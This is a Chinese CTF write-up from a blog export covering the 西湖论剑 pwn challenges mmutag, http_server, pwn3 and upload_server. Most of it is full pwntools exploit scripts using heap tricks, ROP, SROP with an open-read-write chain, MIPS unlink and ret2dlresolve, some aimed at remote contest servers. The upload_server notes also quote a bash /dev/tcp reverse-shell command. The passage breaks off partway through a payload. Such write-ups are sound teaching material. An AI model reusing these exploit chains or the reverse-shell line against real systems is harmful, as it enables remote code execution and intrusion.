<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'source /home/w4rd3n/v8/tools/gdbinit'</span> &gt;&gt; ~/.gdbinit</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'source /home/w4rd3n/v8/tools/gdb-v8-support.py'</span> &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>v8pwn</category>
      </categories>
      <tags>
        <tag>v8</tag>
      </tags>
  </entry>
  <entry>
    <title>西湖论剑</title>
    <url>/year/10/14/cl7iordqv006d293fi66l8qqy/</url>
    <content><![CDATA[<p>1，3题很简单。5题当时已经想到要打printf的返回地址，但是当时调试崩掉了就没出。2题和4题没看，都是server还蛮有意思。</p>
<a id="more"></a>

<h2 id="mmutag"><a href="#mmutag" class="headerlink" title="mmutag"></a>mmutag</h2><p>在栈上构造fake_chunk，然后用rop</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"><span class="comment"># sh = process('./mmutag')</span></span><br><span class="line">sh = remote(<span class="string">'183.129.189.62'</span>,<span class="number">58004</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'id:'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">'content'</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line">    sh.recvuntil(<span class="string">'choise:\n'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'id:'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">'choise:\n'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = <span class="number">0x4006B0</span></span><br><span class="line">puts_got = <span class="number">0x602020</span></span><br><span class="line">libc_start_main = <span class="number">0x602048</span></span><br><span class="line">rdi_ret = <span class="number">0x0000000000400d23</span></span><br><span class="line">rsi_r15_ret = <span class="number">0x0000000000400d21</span></span><br><span class="line">start_addr = <span class="number">0x400750</span></span><br><span class="line">sh.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">sh.sendline(<span class="string">'aaaa'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'tag: '</span>)</span><br><span class="line">stack_addr = int(sh.recvuntil(<span class="string">':'</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">'stack = '</span> + hex(stack_addr))</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'choise:'</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x18</span> + <span class="string">'z'</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'Your content: '</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'z'</span>)</span><br><span class="line">canary = u64(sh.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(<span class="string">'canary = '</span> + hex(canary))</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x10</span> + p64(<span class="number">0x71</span>) + p64(canary)</span><br><span class="line">sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">'aaa'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">'bbb'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">add(<span class="number">3</span>,p64(stack_addr - <span class="number">0x38</span>))</span><br><span class="line">add(<span class="number">4</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="string">'a'</span>)</span><br><span class="line">payload = p64(canary) + p64(<span class="number">0</span>) + p64(rdi_ret) + p64(libc_start_main) + p64(puts_plt) + p64(start_addr)</span><br><span class="line">add(<span class="number">6</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>) <span class="comment"># for start</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.recvuntil('choise:\n')</span></span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">'4'</span>)</span><br><span class="line">puts_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(<span class="string">"puts_addr = "</span> + hex(puts_addr))</span><br><span class="line"><span class="comment"># libc = LibcSearcher('__libc_start_main',puts_addr)</span></span><br><span class="line">libc_base = puts_addr - <span class="number">0x20750</span></span><br><span class="line"><span class="comment"># bin_sh = libc_base + libc.dump('str_bin_sh')</span></span><br><span class="line">system = libc_base + <span class="number">0x453a0</span></span><br><span class="line">bin_sh = libc_base + <span class="number">0x18CE17</span></span><br><span class="line"><span class="comment"># system = libc_base + libc.dump('system')</span></span><br><span class="line">log.success(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line">sh.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">sh.sendline(<span class="string">'aaaa'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'tag: '</span>)</span><br><span class="line">stack_addr = int(sh.recvuntil(<span class="string">':'</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">'stack = '</span> + hex(stack_addr))</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x10</span> + p64(<span class="number">0x71</span>) + p64(canary)</span><br><span class="line">sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">7</span>,p64(stack_addr - <span class="number">0x38</span>))</span><br><span class="line">add(<span class="number">8</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="string">'a'</span>)</span><br><span class="line">payload = p64(canary) + p64(<span class="number">0</span>) + p64(rdi_ret) + p64(bin_sh) + p64(system)</span><br><span class="line">add(<span class="number">10</span>,payload)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">sh.sendline(<span class="string">'4'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="http-server"><a href="#http-server" class="headerlink" title="http_server"></a>http_server</h2><p>模拟了post传参。思路就是tcache打IO_FILE然后leak libc，最后打free_hook写setcontext+53出发SROP，然后调用rop链进行orw</p>
<p>复现的时候碰到了点小问题，就是把stdout的writebase覆盖掉在回显的时候会崩。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">	</span><br><span class="line">context.arch = <span class="string">'AMD64'</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"POST /create Cookie: user=admin token: \x34\r\n\r\ncontent="</span> + content)</span><br><span class="line">    sleep(<span class="number">0.05</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"POST /del Cookie: user=admin token: \x34\r\n\r\nindex="</span> + str(idx))</span><br><span class="line">    sleep(<span class="number">0.05</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"POST /edit Cookie: user=admin token: \x34\r\n\r\nindex="</span> +str(idx) +  <span class="string">"&amp;content="</span>+ content)</span><br><span class="line">    sleep(<span class="number">0.05</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = process(<span class="string">'./ezhttp'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        new(<span class="string">"a"</span>*<span class="number">0x80</span>)</span><br><span class="line">        p.recvuntil(<span class="string">"Your gift: "</span>)</span><br><span class="line">        heap_base = int(p.recvuntil(<span class="string">'"&#125;'</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) - <span class="number">0x260</span></span><br><span class="line">        log.success(<span class="string">'HEAP:\t'</span> + hex(heap_base))</span><br><span class="line">        new(<span class="string">"a"</span>*<span class="number">0x20</span>+<span class="string">'\x00'</span>)</span><br><span class="line">        new(<span class="string">"a"</span>*<span class="number">0x10</span>+<span class="string">'\x00'</span>)</span><br><span class="line">        new(<span class="string">"A"</span>*<span class="number">0x100</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">            free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        free(<span class="number">2</span>)</span><br><span class="line">        free(<span class="number">2</span>)</span><br><span class="line">        free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        new(p64(heap_base+<span class="number">0x260</span>))</span><br><span class="line">        new(p64(heap_base+<span class="number">0x260</span>))</span><br><span class="line"></span><br><span class="line">        new(<span class="string">'\x60\x07\xdd'</span>)</span><br><span class="line"></span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        new(<span class="string">"a"</span>*<span class="number">0x20</span>)</span><br><span class="line">        edit(<span class="number">7</span>,p64(heap_base + <span class="number">0x260</span>))</span><br><span class="line">        new(<span class="string">"A"</span>*<span class="number">0x20</span>)</span><br><span class="line">        new(<span class="string">"A"</span>*<span class="number">0x20</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#new('a'*0x28)</span></span><br><span class="line">        new(p64(<span class="number">0x01010101fbad1801</span>)+<span class="string">"\x01"</span>*<span class="number">0x18</span>+<span class="string">"\xc8"</span>)</span><br><span class="line">        <span class="comment">#edit(10,p64(0xFBAD1800) + p64(0)*3 + '\xC8')</span></span><br><span class="line">        <span class="comment"># pause()</span></span><br><span class="line">        libc_base = u64(p.recvuntil(<span class="string">'\x7F'</span>,timeout=<span class="number">0.3</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.sym[<span class="string">'_IO_2_1_stdin_'</span>]</span><br><span class="line">        log.success(<span class="string">'libc: '</span> + hex(libc_base))</span><br><span class="line">        free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">        system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">        setcontext = libc_base + libc.sym[<span class="string">'setcontext'</span>] + <span class="number">53</span></span><br><span class="line">        rce = libc_base + <span class="number">0x4f322</span></span><br><span class="line">        free(<span class="number">2</span>) </span><br><span class="line">        free(<span class="number">2</span>)</span><br><span class="line">        new(p64(free_hook))</span><br><span class="line">        new(<span class="string">"UUUU"</span>)</span><br><span class="line">        </span><br><span class="line">        new(p64(setcontext))</span><br><span class="line">        ret = libc_base  + <span class="number">0x00000000000008aa</span></span><br><span class="line"></span><br><span class="line">        Open = libc_base + libc.symbols[<span class="string">"open"</span>]</span><br><span class="line">        Read = libc_base + libc.symbols[<span class="string">"read"</span>]</span><br><span class="line">        Puts = libc_base + libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">        pop_rdi_ret = libc_base +<span class="number">0x000000000002155f</span></span><br><span class="line">        pop_rsi_ret = libc_base + <span class="number">0x0000000000023e6a</span></span><br><span class="line">        pop_rdx_ret = libc_base + <span class="number">0x0000000000001b96</span></span><br><span class="line">        orw  = <span class="string">''</span></span><br><span class="line">        orw += p64(pop_rdi_ret)+p64(heap_base + <span class="number">0x3B8</span>)</span><br><span class="line">        orw += p64(pop_rsi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">        orw += p64(Open)</span><br><span class="line">        orw += p64(pop_rdi_ret) + p64(<span class="number">4</span>)</span><br><span class="line">        orw += p64(pop_rdx_ret) + p64(<span class="number">0x30</span>)</span><br><span class="line">        orw += p64(pop_rsi_ret) + p64(heap_base)</span><br><span class="line">        orw += p64(Read)</span><br><span class="line">        orw += p64(pop_rdi_ret)+p64(heap_base)</span><br><span class="line">        orw += p64(Puts)</span><br><span class="line">        orw += <span class="string">'./flag\x00'</span></span><br><span class="line">        frame = SigreturnFrame()</span><br><span class="line">        frame.rax = <span class="number">0</span></span><br><span class="line">        frame.rdi = <span class="number">0</span></span><br><span class="line">        frame.rsi = <span class="number">0</span></span><br><span class="line">        frame.rdx = <span class="number">0</span></span><br><span class="line">        frame.rsp = heap_base + <span class="number">0x250</span> + <span class="number">0x90</span> + <span class="number">0x30</span> + <span class="number">0x20</span> + <span class="number">0x10</span></span><br><span class="line">        frame.rip = ret</span><br><span class="line">        payload = orw + str(frame)[len(orw):]</span><br><span class="line">        <span class="comment"># gdb.attach(p)</span></span><br><span class="line">        <span class="comment"># pause()</span></span><br><span class="line">        edit(<span class="number">3</span>, payload)</span><br><span class="line">        </span><br><span class="line">        free(<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2><p>一道mips unlink，非常简单。虽然貌似官方给的wp不是这个解法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"><span class="comment"># sh = process(['./qemu-mipsel-static','-L','./','./pwn3'])</span></span><br><span class="line">sh = remote(<span class="string">'183.129.189.62'</span>,<span class="number">61303</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'length:'</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">'info:'</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'user:'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;&gt;'</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'edit:'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">'info:'</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'4'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'show:'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">'info: '</span>)</span><br><span class="line">    content = sh.recvuntil(<span class="string">'\nDisplay complete!'</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line">buf_addr = <span class="number">0x411830</span></span><br><span class="line">free_got = <span class="number">0x4117B4</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'aaa'</span>) <span class="comment">#0x69</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'aaa'</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">payload = p32(<span class="number">0</span>) + p32(<span class="number">0x60</span>) + p32(buf_addr - <span class="number">3</span>*<span class="number">4</span>) + p32(buf_addr - <span class="number">2</span>*<span class="number">4</span>) + <span class="string">'A'</span> * <span class="number">0x50</span> + p32(<span class="number">0x60</span>) +p32(<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">8</span> + p32(buf_addr) + p32(<span class="number">0x60</span>) + p32(free_got) + p32(<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">free_addr = u32(show(<span class="number">1</span>).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(<span class="string">'free = '</span> + hex(free_addr))</span><br><span class="line">libc_base = free_addr - <span class="number">0x56B68</span></span><br><span class="line">log.success(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line">system = libc_base + <span class="number">0x5f8f0</span></span><br><span class="line">payload = p32(system)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="upload-server"><a href="#upload-server" class="headerlink" title="upload_server"></a>upload_server</h2><ul>
<li>recvmsg函数的msg.msg_iov-&gt;iov_len 也就是接收数据最大值为0x410，并且将接收到的数据存放在全局变量段(msg.msg_iov-&gt;iov_base=0x603160）。第一段check先通过正则判断数据是否为base64密文格式，然后将其base64解密后存放在s变量栈上，解密后数据的最大长度为0x410*(3/4)=0x30c字节，存在栈溢出。然后判断解密后的数据长度是否为大于64，最后将数据的0-31位与33-64位分别base64加密后将相应内容写入key文件夹中。</li>
<li>由于整段功能代码放在子进程里面实现，所以子进程崩溃后父进程回收即可，不影响父进程运行。server虽然存在栈溢出，但利用起来也十分有限，无法泄露地址。栈溢出长度也有限制，必须进行栈迁移，先通过ROP去调用内置decode函数解密存在在bss段的rop数据，再栈迁去执行bss段的rop_chain.利用dlruntime_resolve一把梭，提前在bss段相应地址构造fake_linkmap数据，由于程序中不存在写相关函数，可使用memset设置link_map的值，最后通过dl调用到system函数执行”bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;\x00” 反弹shell。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">"server"</span>)</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">"127.0.0.1"</span>,<span class="number">2333</span>)</span><br><span class="line"></span><br><span class="line">fake=[<span class="string">'P'</span>, <span class="string">'L'</span>, <span class="string">'\x02'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\xc8'</span>, <span class="string">'\xe6'</span>, <span class="string">']'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x07'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\xf0'</span>, <span class="string">'2'</span>, <span class="string">'`'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'`'</span>, <span class="string">'3'</span>, <span class="string">'`'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'h'</span>, <span class="string">' '</span>, <span class="string">'`'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x08'</span>, <span class="string">'3'</span>, <span class="string">'`'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'h'</span>, <span class="string">'3'</span>, <span class="string">'`'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>, <span class="string">'\x00'</span>]</span><br><span class="line"></span><br><span class="line">fake_link_map=<span class="string">""</span>.join(fake)</span><br><span class="line"></span><br><span class="line">gad1= <span class="number">0x40192a</span></span><br><span class="line">gad2=<span class="number">0x401910</span></span><br><span class="line">decode=<span class="number">0x400ee7</span></span><br><span class="line"></span><br><span class="line">off=<span class="number">0x198</span>   </span><br><span class="line">pop_rdi=<span class="number">0x401933</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x401931</span></span><br><span class="line">leave_ret=<span class="number">0x401823</span></span><br><span class="line">link_map=<span class="number">0x602008</span></span><br><span class="line">memset_got=elf.got[<span class="string">'memset'</span>]</span><br><span class="line">bss=<span class="number">0x603160</span></span><br><span class="line">map_addr=bss+<span class="number">0x190</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"s"</span>*<span class="number">64</span></span><br><span class="line"><span class="comment">#使用mmap修改link_map</span></span><br><span class="line">payload+=p64(gad1)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(memset_got)+p64(<span class="number">1</span>)+p64(map_addr&amp;<span class="number">0xff</span>)+p64(link_map)+p64(gad2)+<span class="string">"1"</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(memset_got)+p64(<span class="number">1</span>)+p64((map_addr&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>)+p64(link_map+<span class="number">1</span>)+p64(gad2)+<span class="string">"1"</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(memset_got)+p64(<span class="number">1</span>)+p64((map_addr&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)+p64(link_map+<span class="number">2</span>)+p64(gad2)+<span class="string">"1"</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(memset_got)+p64(<span class="number">5</span>)+p64(<span class="number">0</span>)+p64(link_map+<span class="number">3</span>)+p64(gad2)+<span class="string">"1"</span>*<span class="number">56</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(bss+<span 